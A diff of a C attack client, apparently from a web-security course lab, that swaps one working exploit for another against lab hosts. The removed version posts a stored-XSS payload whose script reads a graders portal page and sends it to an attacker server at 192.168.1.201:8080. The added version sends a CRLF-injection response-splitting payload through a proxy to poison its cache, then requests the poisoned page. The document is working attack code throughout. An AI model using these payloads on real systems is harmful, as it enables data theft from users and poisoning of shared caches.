@@ -14,7 +14,7 @@
 
 
 #define ATTACKER_SERVER_ADDR 192, 168, 1, 201
-#define ATTACKER_CLIENT_ADDR 192, 168, 1, 202
+#define PROXY_ADDR 192, 168, 1, 202
 #define WEB_SERVER_ADDR 192, 168, 1, 203
 #define STR(x) #x
 
@@ -174,29 +174,41 @@ void _send(const int32_t client, const void * const data, size_t size) {
     }
 }
 
-#define PAYLOAD "comment=<script>(async () => {const url = '/GradersPortalTask2.php';try {const response = await fetch(url);if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}const data = await response.text();console.log('Success:', data);const my_url = 'http://192.168.1.201:8080';response = await fetch(my_url, {method: 'POST',body: data});if (!response.ok) {throw new Error(`HTTP error! Status: ${response.status}`);}} catch (error) {console.error('Fetch failed:', error);return null;}})();</script>"
+#define PAYLOAD "67607%0d%0Connection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"
 
-int32_t main() {
-    int32_t sockfd = create_socket();
-
-    _connect(sockfd, WEB_SERVER_ADDR, 80);
-    char header[1024];
-    memset(header, 0, sizeof(header));
-
-    sprintf(header, "POST /task2stored.php? HTTP/1.1\r\n"
-        "Host: 192.168.1.203\r\n"
-        "Content-Type: application/x-www-form-urlencoded\r\n"
-        "Content-Length: %lu\r\n"
-        "Connection: close\r\n"
-        "\r\n"
-        PAYLOAD, sizeof(PAYLOAD));
-
-    _send(sockfd, header, sizeof(header) - 1);
-
+void empty_recv(const int sockfd) {
     char buf[1024];
     memset(buf, 0, sizeof(buf));
 
     _recv(sockfd, buf, sizeof(buf));
+}
+
+int32_t main() {
+    int32_t sockfd = create_socket();
+
+    _connect(sockfd, PROXY_ADDR, 8080);
+
+    const char mal_req[] = "POST /cgi-bin/course_selector HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Content-Type: application/x-www-form-urlencoded\r\n"
+        "Content-Length: 341\r\n"
+        "Connection: close\r\n"
+        "\r\n"
+        PAYLOAD;
+
+    _send(sockfd, mal_req, sizeof(mal_req) - 1);
+
+    empty_recv(sockfd);
+
+
+    const char inn_req[] = "GET /67607.html HTTP/1.1\r\n"
+        "Host: 192.168.1.202\r\n"
+        "Connection: close\r\n"
+        "\r\n";
+
+    _send(sockfd, inn_req, sizeof(inn_req) - 1);
+
+    empty_recv(sockfd);
 
     close(sockfd);
 }
